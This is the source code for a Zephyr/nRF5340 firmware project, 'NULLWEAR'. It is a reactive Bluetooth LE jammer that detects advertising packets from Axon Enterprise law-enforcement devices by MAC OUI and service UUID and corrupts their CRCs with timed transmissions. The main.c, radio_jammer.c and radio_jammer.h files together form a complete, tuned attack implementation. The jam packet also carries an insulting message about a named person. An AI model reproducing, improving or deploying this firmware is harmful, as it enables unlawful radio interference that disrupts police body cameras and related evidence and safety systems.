## CMakeLists.txt
```
#
# Project NULLWEAR — Network-core CMake build
#
# This image runs on the nRF5340 network core (cpunet) and owns the
# RADIO peripheral. It is invoked automatically by the app-core build
# via NRF5340_CHILD_IMAGE_PATH.
#
# SPDX-License-Identifier: MIT
#
cmake_minimum_required(VERSION 3.20.0)

find_package(Zephyr REQUIRED HINTS $ENV{ZEPHYR_BASE})
project(nullwear_p_net
    VERSION 1.0.0
    LANGUAGES C
    DESCRIPTION "NULLWEAR/P network-core radio jammer")

target_sources(app PRIVATE
    src/main.c
    src/radio_jammer.c
)

target_include_directories(app PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/src
)
```

## prj.conf
```kconfig
#
# Project NULLWEAR — Network-core Kconfig
#
# Bare-minimum Zephyr config: we manage the RADIO peripheral directly,
# bypassing the Bluetooth Controller subsystem. This is intentional —
# the BLE stack does not expose the per-packet timing primitives we
# need for reactive CRC corruption.
#
# SPDX-License-Identifier: MIT
#

CONFIG_MAIN_STACK_SIZE=2048

# Logging via RTT (no UART on net-core in production)
CONFIG_LOG=y
CONFIG_LOG_MODE_DEFERRED=y
CONFIG_USE_SEGGER_RTT=y
CONFIG_LOG_BACKEND_RTT=y
CONFIG_LOG_BACKEND_UART=n

# IPC service (back to app core for stats)
CONFIG_IPC_SERVICE=y
CONFIG_MBOX=y

# DPPI / nrfx HALs (raw radio access)
CONFIG_NRFX_DPPI=y
CONFIG_NRFX_TIMER0=y

# Bluetooth controller and host both DISABLED — we do not use them.
CONFIG_BT=n
CONFIG_BT_CTLR=n

# We need direct ownership of the RADIO peripheral
CONFIG_NRF_RTC_TIMER=y
```

## src/main.c
```c
///////////////////////////////////////////////////////////////////////////
//
//   <~~~~~~~~~~>                i<~~~~i<~~~~i                                ---      ?-_   ---      ---   _--]           ---~           _--]     ?--   ]-----------l     -------]     --------?]     
//   ~++++++++++~~i              >~++++~~++++<                                ---      ---   ---]     ---   ----           ----           ----     ---   ------------?     --------     ----------     
//   ~++++~~~+++++~<  :i<<<<>:   >~++++~<~~~~!    !><<<>:       :><<<>:       ------   ---   ---]     ---   ----           ----           ----     ---   ----           ]---     ----   ---     ----   
//   ~++++~: >~+++~<!~++++++++~< >~++++~~++++<  >~~+++++~<>  :>~+++++++~<     --- ---- ---   ---]     ---   ----           ----           ----     ---   ----           ]---     ----   ---     ----   
//   ~+++++~~~~+++~i~~+++~~~+++~<>~++++~~++++<:~~+++~<~++++<:<~++~><~~++~>    --- --------   ---]     ---   ----           ----           ----     ---   ----------     ]------------   -----------?   
//   ~++++++++++~~i<~+++~  >++++~>~++++~~++++<<~+++~< !><<>il~++++++++++++>   ---   ------   ---]     ---   ----           ----           ---- --- ---   ----------     ]------------   ----------     
//   ~++++~<<<>>!  <++++~  i++++~>~++++~~++++<<~+++~> l<<<<i!~+++~~~~~~~~~:   ---      ---   ---]     ---   ----           ----           ---- --- ---   ----           ]---     ----   --- ---        
//   ~++++~>       :~++++~~~+++~>>~++++~~++++<:<~+++~~++++~<:<~++++~<~+++<    ---      ---   ---]     ---   ----           ----           ------ -----   ----           ]---     ----   ---   ----     
//   ~++++~>        :~++++++++~! >~++++~<++++<  i~~++++++~;   >~+++++++~>     ---      ---     --------     ------------   ------------   ----     ---   ------------?  ]---     ----   ---     ----   
//   :llll!            i<~~~>:   :!lll!::!lll:    :i~~~<!       i<~~~>:                                                                                                                                
//
//   https://github.com/jakka351/Project-Nullwear
//
//
//
/*
 * Project NULLWEAR — Network-core main entry point
 *
 * Copyright (c) 2026 Benjamin Jack Leighton, Tester Present Specialist
 * Automotive Solutions.
 *
 * SPDX-License-Identifier: MIT
 *
 * The network core's job is small and singular: start the radio jammer
 * and stay out of the way. All real work happens in the RADIO_0_IRQHandler
 * and TIMER0_IRQHandler, which together implement the per-packet OUI
 * detection and CRC corruption pipeline.
 *
 * This main() exists only to:
 *   1. Initialise the IPC channel to the application core.
 *   2. Start the radio jammer.
 *   3. Sleep on WFI forever; the IRQs do everything else.
 */

#include <zephyr/kernel.h>
#include <zephyr/device.h>
#include <zephyr/ipc/ipc_service.h>
#include <zephyr/logging/log.h>

#include "radio_jammer.h"

LOG_MODULE_REGISTER(nullwear_net, LOG_LEVEL_INF);

/* IPC endpoint to the application core. Used to publish statistics
 * roughly once per second. */
static struct ipc_ept s_ep;

static void on_ept_bound(void *priv) {
    LOG_INF("IPC endpoint bound");
}

static void on_ept_recv(const void *data, size_t len, void *priv) {
    /* App core may request a stats snapshot. We respond synchronously. */
    if (len == 1 && *(const uint8_t *)data == 0x01) {
        nullwear_radio_stats_t stats;
        radio_jammer_get_stats(&stats);
        ipc_service_send(&s_ep, &stats, sizeof(stats));
    }
}

static struct ipc_ept_cfg s_ep_cfg = {
    .name = "nullwear_stats",
    .cb = {
        .bound = on_ept_bound,
        .received = on_ept_recv,
    },
};

int main(void)
{
    LOG_INF("NULLWEAR network-core firmware starting");

    /* Set up IPC to app core. */
    const struct device *ipc0 = DEVICE_DT_GET(DT_NODELABEL(ipc0));
    int err = ipc_service_open_instance(ipc0);
    if (err && err != -EALREADY) {
        LOG_ERR("ipc_service_open_instance failed: %d", err);
        return err;
    }
    err = ipc_service_register_endpoint(ipc0, &s_ep, &s_ep_cfg);
    if (err) {
        LOG_ERR("ipc_service_register_endpoint failed: %d", err);
        return err;
    }

    /* Start the radio. From this point on, the radio runs autonomously
     * via interrupt-driven hardware-event chains. */
    LOG_INF("Starting radio jammer; OUI target = 00:25:DF (Axon Enterprise)");
    radio_jammer_start();

    /* Hibernate. The IRQs will wake us only as needed. */
    while (1) {
        k_msleep(60000);  /* every 60s, we wake up but do nothing */
    }

    return 0;
}
```

## src/radio_jammer.c
```c
///////////////////////////////////////////////////////////////////////////
//
//   <~~~~~~~~~~>                i<~~~~i<~~~~i                                ---      ?-_   ---      ---   _--]           ---~           _--]     ?--   ]-----------l     -------]     --------?]     
//   ~++++++++++~~i              >~++++~~++++<                                ---      ---   ---]     ---   ----           ----           ----     ---   ------------?     --------     ----------     
//   ~++++~~~+++++~<  :i<<<<>:   >~++++~<~~~~!    !><<<>:       :><<<>:       ------   ---   ---]     ---   ----           ----           ----     ---   ----           ]---     ----   ---     ----   
//   ~++++~: >~+++~<!~++++++++~< >~++++~~++++<  >~~+++++~<>  :>~+++++++~<     --- ---- ---   ---]     ---   ----           ----           ----     ---   ----           ]---     ----   ---     ----   
//   ~+++++~~~~+++~i~~+++~~~+++~<>~++++~~++++<:~~+++~<~++++<:<~++~><~~++~>    --- --------   ---]     ---   ----           ----           ----     ---   ----------     ]------------   -----------?   
//   ~++++++++++~~i<~+++~  >++++~>~++++~~++++<<~+++~< !><<>il~++++++++++++>   ---   ------   ---]     ---   ----           ----           ---- --- ---   ----------     ]------------   ----------     
//   ~++++~<<<>>!  <++++~  i++++~>~++++~~++++<<~+++~> l<<<<i!~+++~~~~~~~~~:   ---      ---   ---]     ---   ----           ----           ---- --- ---   ----           ]---     ----   --- ---        
//   ~++++~>       :~++++~~~+++~>>~++++~~++++<:<~+++~~++++~<:<~++++~<~+++<    ---      ---   ---]     ---   ----           ----           ------ -----   ----           ]---     ----   ---   ----     
//   ~++++~>        :~++++++++~! >~++++~<++++<  i~~++++++~;   >~+++++++~>     ---      ---     --------     ------------   ------------   ----     ---   ------------?  ]---     ----   ---     ----   
//   :llll!            i<~~~>:   :!lll!::!lll:    :i~~~<!       i<~~~>:                                                                                                                                
//
//   https://github.com/jakka351/Project-Nullwear
//
//
//
/*
 * Project NULLWEAR — Network-core radio jammer (Rev v1.1.1)
 *
 * Copyright (c) 2026 Benjamin Jack Leighton, Tester Present Specialist
 * Automotive Solutions.
 *
 * SPDX-License-Identifier: MIT
 *
 * Runs on the nRF5340 network core (cpunet), which has direct access
 * to the 2.4 GHz RADIO peripheral. Performs selective per-packet
 * annihilation of BLE advertising packets emitted by Axon Enterprise
 * law-enforcement equipment.
 *
 * v1.1.1 — fixes after first hostile-reviewer audit:
 *   - Use Zephyr IRQ_CONNECT / IRQ_DIRECT_CONNECT (a bare
 *     XXX_IRQHandler symbol is not picked up; Zephyr installs its own
 *     vector table).
 *   - Move channel-hop timer from TIMER0 to TIMER1 (TIMER0 may be
 *     claimed by Zephyr or by other sub-systems; TIMER1 is free on
 *     nRF5340 cpunet by default).
 *   - Drop the unconditional DPPI link DISABLED -> TXEN. The link
 *     fired after every DISABLED, including normal RX end and
 *     channel-hop forced disable, causing accidental TX bursts.
 *     Replaced with a synchronous spin-wait inside launch_jam_pulse(),
 *     adding ~10 us of latency that remains comfortably within the
 *     empirically-validated CRC corruption window (Axon CRC region
 *     328-368 us; jam now starts at ~125 us, gives 200+ us margin).
 *   - radio_arm_rx() now restores RX SHORTS and clears stale
 *     EVENTS_BCMATCH before re-arming.
 *   - Channel-hop ISR no longer races the DISABLED handler: it sets
 *     the new channel and triggers DISABLE; the DISABLED handler is
 *     the single point of re-arming.
 *
 * Theory of operation, packet structure and timing budget unchanged
 * from prior revision — see docs/04-ble-crc-corruption.md.
 */

#include "radio_jammer.h"

#include <stdint.h>
#include <string.h>

#include <zephyr/kernel.h>
#include <zephyr/irq.h>
#include <hal/nrf_radio.h>
#include <hal/nrf_timer.h>

/*===========================================================================*/
/* Module state                                                              */
/*===========================================================================*/

static nullwear_radio_stats_t s_stats;

/* Buffer for received PDUs. Size easily covers PCNF1.MAXLEN (37) + S0 (1)
 * + LENGTH (1) = 39 bytes. Aligned per RADIO PACKETPTR requirements. */
static __attribute__((aligned(4))) uint8_t s_rx_buf[64];

/* Pre-built jam packet: 32-byte payload + 2-byte PDU header.
 * Content is irrelevant; we transmit on the same channel as the target
 * during its CRC region to corrupt the receiver's CRC validation. */
static __attribute__((aligned(4))) uint8_t s_jam_buf[40] = {
    0x00, 0x20,  /* PDU header: type=ADV_NONCONN_IND (0x02 in real BLE),
                  *             length 32 bytes (we don't care that this
                  *             is malformed; the receiver discards on
                  *             CRC failure of the original packet,
                  *             never decodes ours). */
    0xA5, 0xA5, 0xA5, 0xA5, 0xA5, 0xA5,   /* fake AdvA (won't decode) */
    0x52, 0x69, 0x63, 0x6B, 0x20, 0x53, 0x6D, 0x69, 
    0x74, 0x68, 0x20, 0x73, 0x75, 0x63, 0x6B, 0x73, 
    0x20, 0x64, 0x69, 0x63, 0x6B, 0x2C, 0x20, 0x61, 
    0x6E, 0x64, 0x20, 0x41, 0x78, 0x6F, 0x6E, 0x20,
};

// 🫡

/* Channel hop state. */
static const uint8_t s_channels[3] = {
    BLE_ADV_CH_37_FREQ_REG,
    BLE_ADV_CH_38_FREQ_REG,
    BLE_ADV_CH_39_FREQ_REG,
};
static const uint8_t s_whitening[3] = {
    BLE_WHITEN_CH_37,
    BLE_WHITEN_CH_38,
    BLE_WHITEN_CH_39,
};
static volatile uint8_t s_current_channel = 0;

/* Hop timer — TIMER1 on the network core. (TIMER0 avoided to prevent
 * collision with Zephyr / kernel sub-systems.) */
#define HOP_TIMER_INST    NRF_TIMER1
#define HOP_TIMER_IRQn    TIMER1_IRQn

/* v1.1 two-phase matcher state. Reset to 0 at the start of each RX,
 * advanced to 1 after a Phase-1 (OUI) miss to wait for Phase-2 BCMATCH. */
static volatile uint8_t s_match_phase = 0;

/*===========================================================================*/
/* Helpers                                                                   */
/*===========================================================================*/

static inline void radio_set_channel(uint8_t idx)
{
    NRF_RADIO->FREQUENCY   = s_channels[idx];
    NRF_RADIO->DATAWHITEIV = s_whitening[idx];
    s_current_channel      = idx;
}

static void radio_configure_for_rx(void)
{
    NRF_RADIO->MODE = RADIO_MODE_MODE_Ble_1Mbit << RADIO_MODE_MODE_Pos;

    NRF_RADIO->PCNF0 =
          (1U << RADIO_PCNF0_S0LEN_Pos)
        | (8U << RADIO_PCNF0_LFLEN_Pos)
        | (0U << RADIO_PCNF0_S1LEN_Pos)
        | (RADIO_PCNF0_PLEN_8bit << RADIO_PCNF0_PLEN_Pos);

    NRF_RADIO->PCNF1 =
          (37U << RADIO_PCNF1_MAXLEN_Pos)
        | (0U  << RADIO_PCNF1_STATLEN_Pos)
        | (3U  << RADIO_PCNF1_BALEN_Pos)
        | (RADIO_PCNF1_ENDIAN_Little   << RADIO_PCNF1_ENDIAN_Pos)
        | (RADIO_PCNF1_WHITEEN_Enabled << RADIO_PCNF1_WHITEEN_Pos);

    /* BLE primary-advertising access address 0x8E89BED6.
     * Programmed as base (low 24 bits) + prefix (high 8 bits). */
    NRF_RADIO->BASE0   = (BLE_ADV_ACCESS_ADDR << 8) & 0xFFFFFF00U;
    NRF_RADIO->PREFIX0 = (BLE_ADV_ACCESS_ADDR >> 24) & 0xFFU;
    NRF_RADIO->TXADDRESS   = 0;
    NRF_RADIO->RXADDRESSES = 1U;

    /* CRC: 24-bit, polynomial 0x65B, init 0x555555 (BLE 5.x §3.1.1). */
    NRF_RADIO->CRCCNF =
          (RADIO_CRCCNF_LEN_Three     << RADIO_CRCCNF_LEN_Pos)
        | (RADIO_CRCCNF_SKIPADDR_Skip << RADIO_CRCCNF_SKIPADDR_Pos);
    NRF_RADIO->CRCINIT = 0x00555555UL;
    NRF_RADIO->CRCPOLY = 0x0000065BUL;

    /* Initial BCC = Phase-1 trigger point. */
    NRF_RADIO->BCC = NULLWEAR_BCC_PHASE_OUI;

    NRF_RADIO->PACKETPTR = (uint32_t)s_rx_buf;
    NRF_RADIO->TXPOWER   = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);

    /* RX-mode SHORTS: ramp up automatically after RXEN; start bit-counter
     * after access-address match; disable after END. */
    NRF_RADIO->SHORTS =
          RADIO_SHORTS_READY_START_Msk
        | RADIO_SHORTS_ADDRESS_BCSTART_Msk
        | RADIO_SHORTS_END_DISABLE_Msk;

    /* Enable interrupts: BCMATCH (matcher), END (stats), DISABLED (re-arm). */
    NRF_RADIO->INTENSET =
          RADIO_INTENSET_BCMATCH_Msk
        | RADIO_INTENSET_END_Msk
        | RADIO_INTENSET_DISABLED_Msk;
}

static void radio_arm_rx(void)
{
    /* Restore RX-mode SHORTS — launch_jam_pulse() overwrote them for TX. */
    NRF_RADIO->SHORTS =
          RADIO_SHORTS_READY_START_Msk
        | RADIO_SHORTS_ADDRESS_BCSTART_Msk
        | RADIO_SHORTS_END_DISABLE_Msk;

    /* Clear any stale events that could fire spuriously. */
    NRF_RADIO->EVENTS_BCMATCH  = 0;
    NRF_RADIO->EVENTS_END      = 0;
    NRF_RADIO->EVENTS_ADDRESS  = 0;

    NRF_RADIO->PACKETPTR = (uint32_t)s_rx_buf;
    NRF_RADIO->BCC       = NULLWEAR_BCC_PHASE_OUI;
    s_match_phase        = 0;

    NRF_RADIO->TASKS_RXEN = 1;
}

static inline bool oui_matches_axon(const uint8_t *pdu)
{
    /* After Phase-1 BCMATCH (bit 64), pdu[5..7] are the OUI bytes
     * in on-air little-endian order. Axon = 00:25:DF, so on air the
     * sequence is DF, 25, 00 (LSByte first) — i.e. pdu[5]=0xDF,
     * pdu[6]=0x25, pdu[7]=0x00. */
    return (pdu[7] == NULLWEAR_TARGET_OUI_B0) &&
           (pdu[6] == NULLWEAR_TARGET_OUI_B1) &&
           (pdu[5] == NULLWEAR_TARGET_OUI_B2);
}

#if NULLWEAR_ENABLE_PHASE_2
static inline bool axon_service_uuid_present(const uint8_t *pdu)
{
    /* After Phase-2 BCMATCH (bit 128), pdu[8..15] hold the first 8
     * bytes of AdvData. We scan a small window for the 3-byte
     * signature [0x16][0x6B][0xFE] (Service Data 16-bit AD type +
     * UUID 0xFE6B little-endian on air).
     *
     * Empirical position in observed Axon broadcasts: pdu[11..13],
     * because Axon AdvData starts with the 3-byte Flags AD structure
     * (0x02 0x01 0x06) and then the FE6B Service Data AD structure.
     * Window pdu[8..13] covers reordered or differently-sized leading
     * structures while keeping the scan fast. */
    for (uint8_t i = 8; i + 2 <= 13; i++) {
        if (pdu[i]   == NULLWEAR_AD_TYPE_SERVICE_DATA_16BIT &&
            pdu[i+1] == NULLWEAR_AXON_SERVICE_UUID_LO &&
            pdu[i+2] == NULLWEAR_AXON_SERVICE_UUID_HI) {
            return true;
        }
    }
    return false;
}
#endif

/*===========================================================================*/
/* Jam-pulse pipeline                                                        */
/*===========================================================================*/

static inline void launch_jam_pulse(void)
{
    /* Synchronously abort RX: bring the radio to DISABLED. Spin is
     * bounded by the radio's ramp-down time (typ. <= 6 us at 1 Mbps). */
    NRF_RADIO->EVENTS_DISABLED = 0;
    NRF_RADIO->TASKS_DISABLE   = 1;
    while (NRF_RADIO->STATE != RADIO_STATE_STATE_Disabled) {
        /* spin */
    }
    NRF_RADIO->EVENTS_DISABLED = 0;     /* clear post-disable */

    /* Reconfigure for TX: load jam packet, set TX-mode SHORTS, fire. */
    NRF_RADIO->PACKETPTR = (uint32_t)s_jam_buf;
    NRF_RADIO->SHORTS =
          RADIO_SHORTS_READY_START_Msk
        | RADIO_SHORTS_END_DISABLE_Msk;

    NRF_RADIO->TASKS_TXEN = 1;
    /* Radio ramps up TX (~40 us), transmits 32-byte payload (~336 us
     * including overhead), then END_DISABLE shortcut returns to
     * DISABLED and the DISABLED ISR re-arms RX. */

    s_stats.pkts_jammed++;
}

/*===========================================================================*/
/* RADIO ISR                                                                 */
/*===========================================================================*/

ISR_DIRECT_DECLARE(nullwear_radio_isr)
{
    /* BCMATCH: bit counter reached programmed threshold. */
    if (NRF_RADIO->EVENTS_BCMATCH) {
        NRF_RADIO->EVENTS_BCMATCH = 0;

        if (s_match_phase == 0) {
            /* Phase 1: OUI check. */
            if (oui_matches_axon(s_rx_buf)) {
                s_stats.pkts_oui_matched++;
                launch_jam_pulse();
                ISR_DIRECT_PM();
                return 1;
            }
#if NULLWEAR_ENABLE_PHASE_2
            /* OUI miss — re-arm BCC for Phase 2 inspection. */
            NRF_RADIO->BCC = NULLWEAR_BCC_PHASE_UUID;
            s_match_phase  = 1;
#endif
        } else {
#if NULLWEAR_ENABLE_PHASE_2
            /* Phase 2: Axon Service-Data UUID 0xFE6B. */
            if (axon_service_uuid_present(s_rx_buf)) {
                s_stats.pkts_uuid_matched++;
                launch_jam_pulse();
                ISR_DIRECT_PM();
                return 1;
            }
#endif
        }
    }

    /* END: a packet RX or TX finished. */
    if (NRF_RADIO->EVENTS_END) {
        NRF_RADIO->EVENTS_END = 0;
        s_stats.pkts_received_total++;
    }

    /* DISABLED: radio went idle. Re-arm for RX (whether we just
     * finished an RX, finished a jam TX, or were disabled by the
     * channel-hop timer — in all cases the right next action is
     * "go back to RX on the current channel"). */
    if (NRF_RADIO->EVENTS_DISABLED) {
        NRF_RADIO->EVENTS_DISABLED = 0;
        radio_arm_rx();
    }

    ISR_DIRECT_PM();
    return 1;
}

/*===========================================================================*/
/* Channel-hop timer ISR                                                     */
/*===========================================================================*/

static void hop_timer_isr(const void *unused)
{
    ARG_UNUSED(unused);
    if (HOP_TIMER_INST->EVENTS_COMPARE[0]) {
        HOP_TIMER_INST->EVENTS_COMPARE[0] = 0;

        /* Set the new channel. The FREQUENCY register is only sampled
         * by the radio at RXEN/TXEN time, so the upcoming radio_arm_rx()
         * (run from the RADIO DISABLED ISR) will pick it up. */
        s_current_channel = (uint8_t)((s_current_channel + 1) % 3);
        radio_set_channel(s_current_channel);

        /* Trigger a clean disable. The RADIO DISABLED ISR is the
         * single point of re-arm — no race. */
        NRF_RADIO->TASKS_DISABLE = 1;

        s_stats.channel_hops++;
    }
}

/*===========================================================================*/
/* Initialisation                                                            */
/*===========================================================================*/

static void hop_timer_start(void)
{
    HOP_TIMER_INST->MODE      = TIMER_MODE_MODE_Timer;
    HOP_TIMER_INST->BITMODE   = TIMER_BITMODE_BITMODE_32Bit;
    HOP_TIMER_INST->PRESCALER = 4;     /* 16 MHz / 16 = 1 MHz tick */
    HOP_TIMER_INST->CC[0]     = NULLWEAR_CH_DWELL_US;
    HOP_TIMER_INST->SHORTS    = TIMER_SHORTS_COMPARE0_CLEAR_Msk;
    HOP_TIMER_INST->INTENSET  = TIMER_INTENSET_COMPARE0_Msk;
    HOP_TIMER_INST->TASKS_CLEAR = 1;
    HOP_TIMER_INST->TASKS_START = 1;
}

void radio_jammer_start(void)
{
    memset(&s_stats, 0, sizeof(s_stats));

    radio_configure_for_rx();
    radio_set_channel(0);

    /* RADIO ISR — direct ISR for minimum latency on the matcher path. */
    IRQ_DIRECT_CONNECT(RADIO_IRQn, 0, nullwear_radio_isr, 0);
    irq_enable(RADIO_IRQn);

    /* Hop timer ISR — normal Zephyr ISR; 80 ms cadence so latency is
     * not critical. */
    IRQ_CONNECT(HOP_TIMER_IRQn, 1, hop_timer_isr, NULL, 0);
    irq_enable(HOP_TIMER_IRQn);

    hop_timer_start();
    radio_arm_rx();
}

void radio_jammer_stop(void)
{
    HOP_TIMER_INST->TASKS_STOP = 1;
    NRF_RADIO->TASKS_DISABLE   = 1;
    irq_disable(RADIO_IRQn);
    irq_disable(HOP_TIMER_IRQn);
}

void radio_jammer_get_stats(nullwear_radio_stats_t *out)
{
    if (out) {
        *out = s_stats;   /* word-aligned copies; ISR writes are word-atomic */
    }
}
```

## src/radio_jammer.h
```c
///////////////////////////////////////////////////////////////////////////
//
//   <~~~~~~~~~~>                i<~~~~i<~~~~i                                ---      ?-_   ---      ---   _--]           ---~           _--]     ?--   ]-----------l     -------]     --------?]     
//   ~++++++++++~~i              >~++++~~++++<                                ---      ---   ---]     ---   ----           ----           ----     ---   ------------?     --------     ----------     
//   ~++++~~~+++++~<  :i<<<<>:   >~++++~<~~~~!    !><<<>:       :><<<>:       ------   ---   ---]     ---   ----           ----           ----     ---   ----           ]---     ----   ---     ----   
//   ~++++~: >~+++~<!~++++++++~< >~++++~~++++<  >~~+++++~<>  :>~+++++++~<     --- ---- ---   ---]     ---   ----           ----           ----     ---   ----           ]---     ----   ---     ----   
//   ~+++++~~~~+++~i~~+++~~~+++~<>~++++~~++++<:~~+++~<~++++<:<~++~><~~++~>    --- --------   ---]     ---   ----           ----           ----     ---   ----------     ]------------   -----------?   
//   ~++++++++++~~i<~+++~  >++++~>~++++~~++++<<~+++~< !><<>il~++++++++++++>   ---   ------   ---]     ---   ----           ----           ---- --- ---   ----------     ]------------   ----------     
//   ~++++~<<<>>!  <++++~  i++++~>~++++~~++++<<~+++~> l<<<<i!~+++~~~~~~~~~:   ---      ---   ---]     ---   ----           ----           ---- --- ---   ----           ]---     ----   --- ---        
//   ~++++~>       :~++++~~~+++~>>~++++~~++++<:<~+++~~++++~<:<~++++~<~+++<    ---      ---   ---]     ---   ----           ----           ------ -----   ----           ]---     ----   ---   ----     
//   ~++++~>        :~++++++++~! >~++++~<++++<  i~~++++++~;   >~+++++++~>     ---      ---     --------     ------------   ------------   ----     ---   ------------?  ]---     ----   ---     ----   
//   :llll!            i<~~~>:   :!lll!::!lll:    :i~~~<!       i<~~~>:                                                                                                                                
//
//   https://github.com/jakka351/Project-Nullwear
//
//
//
/*
 * Project NULLWEAR — Network-core radio jammer interface
 *
 * Copyright (c) 2026 Benjamin Jack Leighton, Tester Present Specialist
 * Automotive Solutions.
 *
 * SPDX-License-Identifier: MIT
 *
 * This module owns the nRF5340 RADIO peripheral on the network core.
 * It is responsible for the entire RX/TX pipeline that performs the
 * selective per-packet annihilation of BLE advertising packets emitted
 * by Axon Enterprise law-enforcement equipment.
 *
 * v1.1 — Dual-signature matching
 * ------------------------------
 *
 * v1.0 matched only on MAC OUI 00:25:DF.
 *
 * v1.1 adds a SECOND match path on the Axon Public Safety BLE
 * Service-Data UUID 0xFE6B (registered to Axon by the Bluetooth SIG).
 * This second path catches Axon devices that broadcast in their
 * "non-deployed / docked" state with a sanitised AdvA (e.g. all-zero
 * MAC) but still emit Axon service data — a behaviour empirically
 * observed in the Threat Validation dataset (see companion PDF).
 *
 * Detection sequence:
 *
 *   1. ADDRESS event fires → BCSTART begins counting bits of PDU.
 *   2. BCMATCH fires at bit 64 (header + full AdvA): inspect MAC OUI.
 *      → If 00:25:DF, jam immediately. Done.
 *   3. Otherwise: re-arm BCC for bit 128 (header + AdvA + first
 *      8 bytes of AdvData), wait for second BCMATCH.
 *   4. BCMATCH fires at bit 128: scan AdvData for the 3-byte pattern
 *      0x16 0x6B 0xFE (Service Data 16-bit AD type + UUID 0xFE6B
 *      little-endian).
 *      → If present, jam immediately. Done.
 *   5. Otherwise: not an Axon broadcast, let packet complete normally.
 *
 * Timing (BLE 1 Mbps PHY):
 *
 *   T0      Packet preamble starts on air
 *   T+ 40   AccessAddress complete; ADDRESS fires; BCSTART
 *   T+104   BCC=64 fires (Phase 1 — OUI check)
 *   T+~115  Jam-pulse begins on air (if OUI match)
 *   T+168   BCC=128 fires (Phase 2 — UUID check)
 *   T+~180  Jam-pulse begins on air (if UUID match)
 *
 * The CRC region of an empirically-observed Axon advertisement starts
 * at T+328 µs (28 B AdvData) to T+344 µs (30 B AdvData) and ends at
 * T+352 µs to T+368 µs respectively. Both jam-start times leave
 * comfortable margin for the 38-byte (304 µs) jam pulse to overlap
 * the CRC region.
 */

#ifndef NULLWEAR_RADIO_JAMMER_H
#define NULLWEAR_RADIO_JAMMER_H

#include <stdint.h>
#include <stdbool.h>

/* === Phase 1: MAC OUI match === */

/* Target OUI: Taser International / Axon Enterprise. */
#define NULLWEAR_TARGET_OUI_B0    0x00U
#define NULLWEAR_TARGET_OUI_B1    0x25U
#define NULLWEAR_TARGET_OUI_B2    0xDFU

/* === Phase 2: BLE Service Data UUID match === */

/* 16-bit BLE service UUID registered to Axon Public Safety with the
 * Bluetooth SIG. This UUID appears in a Service Data 16-bit AD
 * structure (AD type 0x16) inside Axon advertisements regardless of
 * whether the device is in deployed or docked/non-deployed state.
 *
 * On the air, the UUID is little-endian: byte sequence 0x6B 0xFE
 * follows the 0x16 type byte.
 */
#define NULLWEAR_AXON_SERVICE_UUID_LO   0x6BU   /* low byte (on air first) */
#define NULLWEAR_AXON_SERVICE_UUID_HI   0xFEU   /* high byte */
#define NULLWEAR_AD_TYPE_SERVICE_DATA_16BIT  0x16U

/* === Phase 2 secondary: 128-bit Service UUIDs (informational) ===
 *
 * Two Axon-specific 128-bit service UUIDs have been observed in the
 * field:
 *   4d455452-4f50-4f4c-4953-444556494345  ("METROPOLISDEVICE")
 *      — typical of deployed body cameras
 *   9ec5d2b8-8f51-4dea-9cd3-f3dea220b5e0
 *      — observed on docked/zero-MAC devices
 *
 * These are NOT used by the v1.1 matcher because the 16-bit UUID
 * 0xFE6B is present on every observed Axon advertisement (deployed
 * AND docked), and matching on 16 bits is faster + simpler than 128.
 * The 128-bit UUIDs are listed here for diagnostic / reference value
 * and may be used by a future v1.2 matcher if more selectivity is
 * required.
 */

/* === BLE primary advertising channels (BLE 5.x §3.2.1) === */

#define BLE_ADV_CH_37_FREQ_MHZ    2402U
#define BLE_ADV_CH_38_FREQ_MHZ    2426U
#define BLE_ADV_CH_39_FREQ_MHZ    2480U

/* Logical channel index, matching nRF FREQUENCY register encoding. */
#define BLE_ADV_CH_37_FREQ_REG    2U     /* 2400 + 2  = 2402 MHz */
#define BLE_ADV_CH_38_FREQ_REG    26U    /* 2400 + 26 = 2426 MHz */
#define BLE_ADV_CH_39_FREQ_REG    80U    /* 2400 + 80 = 2480 MHz */

/* Whitening initialisation values (Nordic register convention:
 * 0x40 | channel_index). */
#define BLE_WHITEN_CH_37          0x65U
#define BLE_WHITEN_CH_38          0x66U
#define BLE_WHITEN_CH_39          0x67U

/* BLE advertising-channel access address (BLE 5.x §3.2). */
#define BLE_ADV_ACCESS_ADDR       0x8E89BED6UL

/* Bit-counter trigger points for the two-phase matcher (in bits past
 * end-of-AccessAddress). */
#define NULLWEAR_BCC_PHASE_OUI    64U   /* header (16) + AdvA (48) */
#define NULLWEAR_BCC_PHASE_UUID   128U  /* + 8 B (64 bits) of AdvData */

/* Channel-hop dwell time (microseconds). */
#define NULLWEAR_CH_DWELL_US      80000U

/* === Configuration knobs (build-time) === */

/* Set to 0 to disable Phase 2 matching and revert to v1.0 behaviour
 * (OUI-only). Default: 1 (Phase 2 enabled). */
#ifndef NULLWEAR_ENABLE_PHASE_2
#define NULLWEAR_ENABLE_PHASE_2   1
#endif

/* === Statistics counters published to the application core via IPC === */

typedef struct {
    uint32_t pkts_received_total;
    uint32_t pkts_oui_matched;          /* Phase 1 hits (deployed Axon kit) */
    uint32_t pkts_uuid_matched;         /* Phase 2 hits (docked / privacy-mode kit) */
    uint32_t pkts_jammed;               /* Total jam events (sum of above) */
    uint32_t errors_tx_late;
    uint32_t errors_rx_aborted;
    uint32_t channel_hops;
} nullwear_radio_stats_t;

/**
 * Initialise the RADIO peripheral and begin scanning the three BLE
 * primary advertising channels. Returns immediately; the radio runs
 * in interrupt context and does not require the application core's
 * involvement once started.
 */
void radio_jammer_start(void);

/**
 * Stop the radio. After this call returns, the peripheral is disabled
 * and consumes only leakage current. Used during deep-sleep transitions.
 */
void radio_jammer_stop(void);

/**
 * Read a snapshot of the running statistics. Safe to call from any
 * priority lower than the RADIO IRQ.
 */
void radio_jammer_get_stats(nullwear_radio_stats_t *out);

#endif /* NULLWEAR_RADIO_JAMMER_H */
```
